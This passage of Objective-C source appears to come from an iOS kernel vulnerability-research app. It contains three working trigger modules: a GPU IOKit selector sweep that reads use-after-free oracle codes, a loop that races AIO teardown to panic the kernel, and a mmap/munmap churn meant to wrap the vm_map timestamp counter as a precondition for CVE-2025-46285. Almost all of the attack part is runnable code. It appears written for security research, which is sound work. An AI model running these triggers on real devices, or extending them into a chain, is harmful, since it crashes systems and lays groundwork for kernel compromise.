        for (int i = 0; cls[i]; i++) {
            for (uint32_t t = 0; t < 4; t++) {
                CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
                if (!m) continue;
                io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
                if (!d) continue;
                io_connect_t c = 0;
                kern_return_t kr = IOServiceOpen(d, mach_task_self(), t, &c);
                IOObjectRelease(d);
                if (kr == KERN_SUCCESS && c) {
                    AveLog(S(@"    class %-18s type %u -> OPEN", cls[i], t));
                    gpu = c; who = cls[i];
                    break;
                }
            }
            if (gpu) break;
        }
    }

    // ---- (3) sweep the accelerator selectors, log every code ----
    // The PoC's oracle codes: 0xe00002c2 (resource not found) vs
    // 0xe00002be (stale entry processed with our spray data).
    if (gpu) {
        AveLog(@"[gpu64788] selector sweep on the accelerator client:");
        for (uint32_t sel = 0; sel < 40; sel++) {
            uint64_t in[4] = {1, 0, 0, 0};
            uint64_t out[4] = {0, 0, 0, 0};
            size_t outSz = sizeof(out);
            kern_return_t r = IOConnectCallMethod(gpu, sel, in, 4, NULL, 0,
                                                  out, &outSz, NULL, NULL);
            if (r != (kern_return_t)0xe00002c2 && r != KERN_SUCCESS)
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            else
                AveLog(S(@"    sel %-3u -> %#x", sel, r));
            if (r == (kern_return_t)0xe00002c2 || r == (kern_return_t)0xe00002be)
                AveLog(S(@"    sel %-3u -> ORACLE CODE %#x (%s)", sel, r,
                         r == (kern_return_t)0xe00002be ? @"STALE ENTRY PROCESSED" : @"not found"));
        }
        IOServiceClose(gpu);
    }
    AveSetStatus(@"64788 oracle done - see the log");
    return @"64788 oracle: overflow surfaces + selector sweep logged (no writes, no chain)";
}

// ===========================================================================
// 3. Family B reproducer: the aio_workq_entry UAF (48 panics, pc+0x4cff40)
//    The second panic family (48 of the 60 device panics, never analysed
//    before) faults in lck_mtx_lock fast path on a lock at [obj+0x58] of a
//    FREED object; the neighbourhood strings are kern_aio.c, lio_listio,
//    kern_descrip.c and the XNU panic "aio_workq_entry %p being freed while
//    still enqueued" - i.e. the AIO work-queue entry teardown.  This module
//    drives exactly that shape: submit POSIX AIO reads, then tear the
//    descriptors down under them (close + aio_cancel) so completions and
//    teardown race, in a loop.  A panic is the reproduction.
// ===========================================================================
#import <aio.h>

NSString *ModAioRace(void) {
    AveLog(@"[aio] === family B reproducer: aio_workq_entry teardown race (48 panics) ===");
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                            NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"aio_race_file"];
    const char *cpath = path.UTF8String;

    int panics_expected = 0;
    for (int round = 0; round < 24; round++) {
        @autoreleasepool {
            // a fresh file with real content every round
            int wfd = open(cpath, O_RDWR | O_CREAT | O_TRUNC, 0600);
            if (wfd < 0) { AveLog(S(@"[aio] round %d: create failed %d", round, errno)); continue; }
            char buf[4096];
            memset(buf, 0x41, sizeof buf);
            for (int i = 0; i < 8; i++) if (write(wfd, buf, sizeof buf) != (ssize_t)sizeof buf) break;
            fsync(wfd);
            lseek(wfd, 0, SEEK_SET);

            // submit AIO reads on it (4 at a time: the per-process queue is small and
            // EAGAINs once it saturates - measured: 16-at-a-time filled it forever)
            enum { N = 4 };
            struct aiocb cb[N];
            char *rbuf[N];
            int queued = 0;
            for (int i = 0; i < N; i++) {
                rbuf[i] = malloc(2048);
                memset(&cb[i], 0, sizeof cb[i]);
                cb[i].aio_fildes = wfd;
                cb[i].aio_buf = rbuf[i];
                cb[i].aio_nbytes = 2048;
                cb[i].aio_offset = (off_t)(i * 2048);
                cb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
                if (aio_read(&cb[i]) == 0) queued++;
                else AveLog(S(@"[aio] round %d: aio_read %d -> %d (not queued)", round, i, errno));
            }
            // tear the descriptor down under the in-flight requests
            aio_cancel(wfd, NULL);   // NULL = cancel every outstanding request on this fd
            close(wfd);
            // DRAIN: reap the entries (aio_return/aio_suspend) so the queue never
            // saturates - without this the per-process AIO queue stays full and
            // every later aio_read fails EAGAIN, which is exactly what happened
            // on the first device run (35 = EAGAIN on all 16).
            const struct aiocb *waitList[N];
            for (int i = 0; i < N; i++) waitList[i] = &cb[i];
            aio_suspend((void *)waitList, N, NULL);
            for (int i = 0; i < N; i++) { ssize_t r = aio_return((struct aiocb *)&cb[i]); (void)r; }
            // let the completions/teardown run
            usleep(30000);
            for (int i = 0; i < N; i++) {
                if (rbuf[i]) { volatile char c = rbuf[i][0]; (void)c; free(rbuf[i]); }
            }
            unlink(cpath);
            panics_expected++;
            if ((round & 7) == 7)
                AveLog(S(@"[aio] %d rounds of AIO teardown churn done (last round queued %d/4)", round + 1, queued));
        }
    }
    AveSetStatus(@"aio race churn done");
    return S(@"aio teardown churn: %d rounds (submit + drain + close + cancel); a panic = family B reproduced", panics_expected);
}
static long long rs_vmwrap_read(void) {
    FILE *f = fopen([[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                         NSUserDomainMask, YES) firstObject]
                         stringByAppendingPathComponent:@"rs112477.log"] UTF8String], "r");
    if (!f) return 0;
    char line[256];
    long long v = 0;
    while (fgets(line, sizeof line, f))
        if (sscanf(line, "VMWRAP ops=%lld", &v) == 2) { /* keep last */ }
    fclose(f);
    return v;
}

static void rs_vmwrap_save(long long ops) {
    NSString *p = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                     NSUserDomainMask, YES) firstObject]
                     stringByAppendingPathComponent:@"rs112477.log"];
    FILE *f = fopen(p.UTF8String, "a");
    if (f) { fprintf(f, "VMWRAP ops=%lld\n", ops); fflush(f); fclose(f); }
}

NSString *ModVmMapWrap(void) {
    // The device measurement (24.11): 4.05 Mops/s on one map -> 2^32 wraps in
    // ~17.7 minutes.  So this now runs until the accumulated counter reaches
    // the wrap (resumable across launches via VMWRAP in the forensic file),
    // with a hard time cap.  Anything that breaks during the wrap is the
    // CVE-2025-46285 precondition firing.
    const long long kTarget = 4294967296LL + 1048576LL;   // 2^32 + margin
    const double kTimeCapSecs = 1500.0;                   // 25 min per launch
    long long done0 = rs_vmwrap_read();
    AveLog(@"[vmwrap] === CVE-2025-46285: vm_map timestamp (32-bit version counter) wrap measurement ===");
    AveLog(S(@"[vmwrap] previous launches: %lld ops", done0));

    const size_t kPage = 4096;
    void *base = mmap(NULL, kPage * 4, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) return @"vmwrap: mmap failed";

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    long long n = 0;
    int first_errno = 0;
    for (long long i = 0; ; i++) {
        // each pair = one entry insert + one remove in the SAME map
        // (plain mmap/munmap: every insert/remove bumps map->timestamp)
        void *p = mmap(NULL, kPage, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED) {
            munmap(p, kPage);
            n += 2;
        } else if (!first_errno) {
            first_errno = errno;
            AveLog(S(@"[vmwrap] first mmap failure: errno=%d (%s)", errno, strerror(errno)));
        }
        if ((i & 0xFFFFFF) == 0xFFFFFF) {
            clock_gettime(CLOCK_MONOTONIC, &t1);
            double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
            AveLog(S(@"[vmwrap] %lld ops in %.1fs (%.2f Mops/s) total %lld", n, el, n / el / 1e6, done0 + n));
            if (done0 + n >= kTarget) {
                AveLog(S(@"[vmwrap] *** 2^32 WRAP TARGET REACHED (total %lld) ***", done0 + n));
                break;
            }
            if (el >= kTimeCapSecs) {
                AveLog(@"[vmwrap] time cap reached - relaunch to continue (resumable)");
                break;
            }
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    long long total = done0 + n;
    rs_vmwrap_save(total);
    double rate = n / el;
    double wrap_secs = 4294967296.0 / rate;
    munmap(base, kPage * 4);
    AveLog(S(@"[vmwrap] this run: %lld ops in %.1fs = %.2f Mops/s", n, el, rate / 1e6));
    AveLog(S(@"[vmwrap] total %lld ops; projected time to 2^32 on one map: %.0f s (%.1f min)",
             total, wrap_secs, wrap_secs / 60.0));
    AveSetStatus(@"vmwrap: rate measured, see the log");
    return S(@"vmwrap: %lld ops @ %.2f Mops/s; 2^32 wrap in %.1f min of churn",
              n, rate / 1e6, wrap_secs / 60.0);
}